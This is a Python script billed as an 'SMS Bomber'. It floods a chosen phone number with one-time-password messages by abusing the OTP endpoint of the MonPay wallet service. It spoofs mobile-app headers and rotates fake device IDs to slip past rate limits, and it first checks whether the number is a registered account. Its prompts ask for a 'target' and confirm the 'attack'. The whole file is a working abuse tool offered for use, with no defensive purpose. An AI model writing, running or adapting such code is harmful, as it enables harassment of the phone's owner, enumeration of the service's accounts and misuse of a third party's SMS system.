import asyncio
import aiohttp
import subprocess
import datetime
import os
import sys
import time
import random
import hashlib
from typing import List, Dict

GREEN = '\033[92m'
WHITE = '\033[97m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'
DIM = '\033[2m'
BLINK = '\033[5m'

class SMSBomber:
    def __init__(self, concurrency: int = 2):
        self.concurrency = concurrency
        self.semaphore = asyncio.Semaphore(concurrency)
        self.base_url = "https://wallet.monpay.mn"
        self.bayas_endpoint = "/rest/bayas/otp"
        self.dev_contact = "@telmunn"
        self.github_raw_url = "https://raw.githubusercontent.com/CPMTooldev/Sms/main/devices.txt"
        self.device_token = self.get_or_create_token()
        self.request_count = 0
        self.last_request_time = {}
        self.max_requests_per_minute = 30
        self.current_server_time = None
        self.access_expiry = None
        
        self.clear_screen()
        self.show_banner()
        
        if not self.verify_token_with_github():
            print(f"{GREEN}Your device token: {WHITE}{self.device_token}{RESET}")
            print(f"{GREEN}Contact developer: {WHITE}{self.dev_contact}{RESET}")
            sys.exit(1)

    async def initialize(self):
        await self.fetch_server_time()
        self.headers = self.create_headers()

    def create_headers(self):
        device_id = self.generate_dynamic_device_id()
        device_osver = self.get_fixed_device_osver()
        app_version = "7.4.21"
        
        return {
            "user-agent": "Dart/3.5 (dart:io)",
            "x-real-deviceos": "android",
            "accept-encoding": "gzip",
            "xdeviceaddress": device_id,
            "content-type": "application/json",
            "x-real-devicemodel": self.get_random_device_model(),
            "accept": "application/json",
            "accept-language": "mn",
            "x-real-devicetype": "mobile",
            "fraction-ver": "1",
            "host": "wallet.monpay.mn",
            "x-real-deviceosver": device_osver,
            "x-real-appname": "monpay",
            "x-real-appversion": app_version
        }

    def get_fixed_device_osver(self):
        android_versions = ["10", "11", "12", "13", "14"]
        return random.choice(android_versions)

    def generate_dynamic_device_id(self) -> str:
        timestamp = str(int(time.time() * 1000))
        random_part = str(random.randint(100000, 999999))
        device_fingerprint = f"{self.device_token}{timestamp}{random_part}"
        hash_object = hashlib.md5(device_fingerprint.encode())
        device_id = hash_object.hexdigest().upper()
        
        formatted_id = f"{device_id[0:8]}-{device_id[8:12]}-{device_id[12:16]}-{device_id[16:20]}-{device_id[20:32]}"
        return formatted_id

    def get_random_device_model(self) -> str:
        models = [
            "SM-S928B", "SM-G998B", "SM-F946B", "SM-A546B", 
            "SM-N986B", "SM-G781B", "SM-F721B", "SM-S911B"
        ]
        return random.choice(models)

    async def fetch_server_time(self):
        time_apis = [
            "https://timeapi.io/api/Time/current/zone?timeZone=Asia/Ulaanbaatar",
            "https://api.time.is/now.json",
            "https://www.timeapi.org/utc/now",
            "http://worldclockapi.com/api/json/utc/now"
        ]
        
        for api in time_apis:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(api, timeout=5) as response:
                        if response.status == 200:
                            data = await response.json()
                            
                            if "dateTime" in data:
                                datetime_str = data["dateTime"]
                                if "T" in datetime_str:
                                    date_str = datetime_str.split("T")[0]
                                else:
                                    date_str = datetime_str.split(" ")[0]
                                self.current_server_time = datetime.datetime.strptime(date_str, "%Y-%m-%d")
                                self.calculate_access_expiry()
                                self.print_success(f"Server date: {self.current_server_time.strftime('%Y-%m-%d')}")
                                return
                                
                            elif "currentDateTime" in data:
                                datetime_str = data["currentDateTime"]
                                if "T" in datetime_str:
                                    date_str = datetime_str.split("T")[0]
                                else:
                                    date_str = datetime_str.split(" ")[0]
                                self.current_server_time = datetime.datetime.strptime(date_str, "%Y-%m-%d")
                                self.calculate_access_expiry()
                                self.print_success(f"Server date: {self.current_server_time.strftime('%Y-%m-%d')}")
                                return
                                
            except Exception as e:
                continue
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://www.google.com", timeout=5) as response:
                    if "Date" in response.headers:
                        date_str = response.headers["Date"]
                        date_obj = datetime.datetime.strptime(date_str, "%a, %d %b %Y %H:%M:%S %Z")
                        self.current_server_time = date_obj
                        self.calculate_access_expiry()
                        self.print_success(f"Server date: {self.current_server_time.strftime('%Y-%m-%d')}")
                        return
        except:
            pass
        
        self.print_warning("Could not fetch server time, using local time")
        self.current_server_time = datetime.datetime.now()
        self.calculate_access_expiry()

    def calculate_access_expiry(self):
        if self.current_server_time:
            if isinstance(self.current_server_time, datetime.datetime):
                expiry = datetime.datetime(
                    self.current_server_time.year, 
                    self.current_server_time.month, 
                    self.current_server_time.day, 
                    23, 59, 59
                )
            else:
                expiry = datetime.datetime(
                    self.current_server_time.year, 
                    self.current_server_time.month, 
                    self.current_server_time.day, 
                    23, 59, 59
                )
        else:
            now = datetime.datetime.now()
            expiry = datetime.datetime(now.year, now.month, now.day, 23, 59, 59)
        
        self.access_expiry = expiry

    def get_time_remaining(self):
        if not self.access_expiry:
            return "Unknown"
        
        now = datetime.datetime.now()
        time_left = self.access_expiry - now
        
        if time_left.total_seconds() < 0:
            return "EXPIRED"
        
        hours = time_left.seconds // 3600
        minutes = (time_left.seconds % 3600) // 60
        seconds = time_left.seconds % 60
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

    def get_expiry_date(self):
        if self.access_expiry:
            return self.access_expiry.strftime("%Y-%m-%d")
        return "Unknown"

    def animate_loading(self, text, duration=1):
        chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
        for i in range(int(duration * 10)):
            print(f'\r{GREEN}[{WHITE}{chars[i % len(chars)]}{RESET}{GREEN}] {text}{RESET}', end='', flush=True)
            time.sleep(0.1)
        print()

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def show_banner(self):
        self.clear_screen()
        print(f"{GREEN}{BOLD}Initializing SMS Bomber v3.0...{RESET}")
        time.sleep(0.5)
        
        banner = f"""
{GREEN}{BOLD}
    ╔══════════════════════════════════════════════════════════╗
    ║  ███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗  ║
    ║  ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗ ║
    ║  ███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝ ║
    ║  ╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗ ║
    ║  ███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝ ║
    ║  ╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝  ║
    ║                                                                      ║
    ║                    ╔════════════════════════════╗                   ║
    ║                    ║  {WHITE}Cool EDITION{RESET}{GREEN}          ║                   ║
    ║                    ╚════════════════════════════╝                   ║
    ║                          {CYAN}[ v3.0 ]{GREEN}                                   ║
    ╚══════════════════════════════════════════════════════════╝
    
    {CYAN}CoolShit ever i made...{RESET}
    {YELLOW} Access expires on: {WHITE}{self.get_expiry_date()}{RESET}
    {YELLOW} Time remaining:   {WHITE}{self.get_time_remaining()}{RESET}
{RESET}"""
        print(banner)
        self.animate_loading("Loading modules", 1)
        print()

    def print_status(self, message, status="INFO"):
        symbols = {"INFO": "[*]", "SUCCESS": "[+]", "ERROR": "[-]", "WARNING": "[!]", "TEST": "[?]"}
        colors = {"INFO": CYAN, "SUCCESS": GREEN, "ERROR": RED, "WARNING": YELLOW, "TEST": BLUE}
        symbol = symbols.get(status, "[*]")
        color = colors.get(status, GREEN)
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"{GREEN}[{WHITE}{timestamp}{GREEN}] {GREEN}{symbol}{RESET} {color}{message}{RESET}")

    def print_success(self, message):
        self.print_status(message, "SUCCESS")

    def print_error(self, message):
        self.print_status(message, "ERROR")

    def print_warning(self, message):
        self.print_status(message, "WARNING")

    def print_info(self, message):
        self.print_status(message, "INFO")

    def print_test(self, message):
        self.print_status(message, "TEST")

    def get_or_create_token(self) -> str:
        token_file = os.path.expanduser("~/.device_token")
        
        if os.path.exists(token_file):
            with open(token_file, 'r') as f:
                token = f.read().strip()
                if token:
                    return token
        
        try:
            result = subprocess.run(['uuidgen'], capture_output=True, text=True, shell=True)
            if result.returncode == 0 and result.stdout.strip():
                token = result.stdout.strip()
            else:
                import uuid
                token = str(uuid.uuid4())
        except:
            import uuid
            token = str(uuid.uuid4())
        
        with open(token_file, 'w') as f:
            f.write(token)
        
        return token

    def verify_token_with_github(self) -> bool:
        try:
            import requests
            self.animate_loading("Verifying device token", 0.5)
            response = requests.get(self.github_raw_url, timeout=10)
            if response.status_code == 200:
                lines = response.text.split('\n')
                for line in lines:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    parts = [p.strip() for p in line.split('|')]
                    if len(parts) >= 1:
                        token = parts[0]
                        if token == self.device_token:
                            self.print_success("Device authorized")
                            return True
                return False
            else:
                self.print_error("Failed to verify token")
                return False
        except Exception as e:
            self.print_error("Connection error")
            return False

    def check_success_response(self, response_data: Dict) -> bool:
        try:
            if isinstance(response_data, dict):
                if response_data.get("code") == 0 and response_data.get("info") == "Амжилттай":
                    result = response_data.get("result", {})
                    if result.get("accessType") == "PHONE" and result.get("state") == "OTP_SENT":
                        return True
            return False
        except:
            return False

    async def send_test_otp(self, session: aiohttp.ClientSession, phone_number: str) -> Dict:
        self.print_test(f"Testing number {phone_number}")
        params = {"accessValue": phone_number, "isNew": "false"}
        
        try:
            async with session.get(f"{self.base_url}{self.bayas_endpoint}", params=params, headers=self.headers, timeout=10) as response:
                try:
                    response_data = await response.json()
                except:
                    response_data = await response.text()
                
                if isinstance(response_data, dict):
                    code = response_data.get("code")
                    if code == 0:
                        self.print_success("Number is REGISTERED")
                        return {"registered": True, "mode": False}
                    elif code in [2, 3, 5]:
                        self.print_warning("Number is NOT REGISTERED")
                        return {"registered": False, "mode": True}
                
                self.print_warning("Test inconclusive")
                return {"registered": True, "mode": False}
        except Exception as e:
            self.print_error(f"Test failed: {str(e)[:30]}")
            return {"registered": True, "mode": False}

    async def send_otp(self, session: aiohttp.ClientSession, phone_number: str, is_new: bool, attempt_num: int) -> Dict:
        async with self.semaphore:
            if not self.check_rate_limit(phone_number):
                await asyncio.sleep(0.5)
            
            params = {"accessValue": phone_number, "isNew": str(is_new).lower()}
            mode_text = "NEW" if is_new else "EXISTING"
            
            try:
                start_time = datetime.datetime.now()
                async with session.get(f"{self.base_url}{self.bayas_endpoint}", params=params, headers=self.headers, timeout=10) as response:
                    response_time = (datetime.datetime.now() - start_time).total_seconds()
                    
                    try:
                        response_data = await response.json()
                    except:
                        response_data = await response.text()
                    
                    is_success = self.check_success_response(response_data) if isinstance(response_data, dict) else False
                    
                    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
                    
                    if is_success:
                        print(f"{GREEN}[{WHITE}{timestamp}{GREEN}] {GREEN}[+]{RESET} {GREEN}SMS sent to {WHITE}{phone_number}{GREEN} [{mode_text}] {DIM}({response_time:.2f}s){RESET}")
                    else:
                        error_code = "?"
                        if isinstance(response_data, dict):
                            error_code = response_data.get("code", "?")
                        print(f"{GREEN}[{WHITE}{timestamp}{GREEN}] {RED}[-]{RESET} {RED}Failed: {WHITE}{phone_number}{RED} [{mode_text}] {DIM}(Code {error_code}){RESET}")
                    
                    return {"success": is_success, "code": response_data.get("code") if isinstance(response_data, dict) else None}
                    
            except Exception as e:
                timestamp = datetime.datetime.now().strftime("%H:%M:%S")
                print(f"{GREEN}[{WHITE}{timestamp}{GREEN}] {RED}[-]{RESET} {RED}Error: {WHITE}{phone_number}{RED} [{mode_text}]{RESET}")
                return {"success": False, "code": None}

    def check_rate_limit(self, phone: str) -> bool:
        now = time.time()
        if phone in self.last_request_time:
            if now - self.last_request_time[phone] < 1:
                return False
        self.last_request_time[phone] = now
        return True

    async def send_bulk_sms(self, phone_number: str, count: int):
        print(f"\n{GREEN}{'='*60}{RESET}")
        print(f"{GREEN}[{WHITE}TARGET{RESET}{GREEN}] {WHITE}{phone_number}{RESET}")
        print(f"{GREEN}[{WHITE}COUNT{RESET}{GREEN}] {WHITE}{count} SMS{RESET}")
        print(f"{GREEN}[{WHITE}CONCURRENCY{RESET}{GREEN}] {WHITE}{self.concurrency}{RESET}")
        print(f"{GREEN}[{WHITE}EXPIRES{RESET}{GREEN}] {WHITE}{self.get_expiry_date()} ({self.get_time_remaining()}){RESET}")
        print(f"{GREEN}{'='*60}{RESET}\n")
        
        connector = aiohttp.TCPConnector(limit=self.concurrency, ttl_dns_cache=300, force_close=True)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            self.animate_loading("Running initial test", 0.7)
            test_result = await self.send_test_otp(session, phone_number)
            current_mode = test_result["mode"]
            mode_text = "NEW" if current_mode else "EXISTING"
            
            self.print_info(f"Starting attack with {mode_text} mode...")
            time.sleep(0.5)
            
            print(f"\n{GREEN}{'─'*60}{RESET}")
            
            all_results = []
            tasks = []
            attempt_counter = 1
            
            progress_chars = ["◜", "◝", "◞", "◟"]
            start_time = time.time()
            
            for i in range(count):
                if i % 3 == 0:
                    self.headers["xdeviceaddress"] = self.generate_dynamic_device_id()
                
                task = self.send_otp(session, phone_number, current_mode, attempt_counter)
                tasks.append(task)
                attempt_counter += 1
                
                elapsed = time.time() - start_time
                avg_time = elapsed / (i + 1) if i > 0 else 0
                remaining = avg_time * (count - i - 1)
                
                if i % 5 == 0:
                    print(f'\r{GREEN}[{WHITE}{progress_chars[i % 4]}{RESET}{GREEN}] Progress: {i+1}/{count} | ETA: {remaining:.1f}s{RESET}', end='', flush=True)
                
                if len(tasks) >= self.concurrency or i == count - 1:
                    results = await asyncio.gather(*tasks)
                    all_results.extend(results)
                    tasks = []
                    
                    if i < count - 1:
                        await asyncio.sleep(random.uniform(0.1, 0.3))
            
            total_time = time.time() - start_time
            print(f"\r{GREEN}[{WHITE}✓{RESET}{GREEN}] Progress: {count}/{count} | Time: {total_time:.1f}s{RESET}")
            
            total_success = sum(1 for r in all_results if r.get("success", False))
            
            print(f"\n{GREEN}{'─'*60}{RESET}")
            print(f"\n{GREEN}{BOLD}ATTACK COMPLETE{RESET}")
            print(f"{GREEN}{'='*60}{RESET}")
            
            success_rate = (total_success / count) * 100 if count > 0 else 0
            
            bars = 40
            success_bars = int((total_success / count) * bars) if count > 0 else 0
            failed_bars = bars - success_bars
            
            print(f"{GREEN}Total:      {WHITE}{count}{RESET}")
            print(f"{GREEN}Success:    {GREEN}{'█' * success_bars} {total_success}{RESET}")
            print(f"{GREEN}Failed:     {RED}{'█' * failed_bars} {count - total_success}{RESET}")
            print(f"{GREEN}Rate:       {WHITE}{success_rate:.1f}%{RESET}")
            print(f"{GREEN}Time:       {WHITE}{total_time:.1f}s{RESET}")
            print(f"{GREEN}Test:       {WHITE}{'REGISTERED' if not current_mode else 'NOT REGISTERED'}{RESET}")
            print(f"{GREEN}Mode:       {WHITE}{mode_text}{RESET}")
            print(f"{GREEN}Expires:    {WHITE}{self.get_expiry_date()} ({self.get_time_remaining()}){RESET}")
            print(f"{GREEN}{'='*60}{RESET}\n")

async def main():
    bomber = SMSBomber(concurrency=7)
    await bomber.initialize()
    
    while True:
        print(f"\n{GREEN}{BOLD}╔════════════════════════════╗{RESET}")
        print(f"{GREEN}{BOLD}║{RESET}     ENTER TARGET         {GREEN}{BOLD}║{RESET}")
        print(f"{GREEN}{BOLD}╚════════════════════════════╝{RESET}\n")
        
        phone = input(f"{GREEN}[?] Phone number: {WHITE}").strip()
        print(RESET, end='')
        
        if not phone or not phone.isdigit() or len(phone) < 8:
            bomber.print_error("Invalid phone number")
            continue
        
        try:
            count = int(input(f"{GREEN}[?] SMS count (max 500): {WHITE}").strip())
            print(RESET, end='')
            if count <= 0 or count > 500:
                bomber.print_error("Count must be between 1-500")
                continue
        except ValueError:
            bomber.print_error("Invalid number")
            continue
        
        print()
        confirm = input(f"{GREEN}[?] Attack {WHITE}{phone}{GREEN} with {WHITE}{count}{GREEN} SMS? (y/n): {WHITE}").strip().lower()
        print(RESET, end='')
        
        if confirm == 'y':
            await bomber.send_bulk_sms(phone, count)
            
            again = input(f"\n{GREEN}[?] Another target? (y/n): {WHITE}").strip().lower()
            print(RESET, end='')
            if again != 'y':
                print(f"\n{GREEN}{BOLD}Stay safe!{RESET}\n")
                break
            bomber.clear_screen()
            bomber.show_banner()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{GREEN}{BOLD}Exiting...{RESET}\n")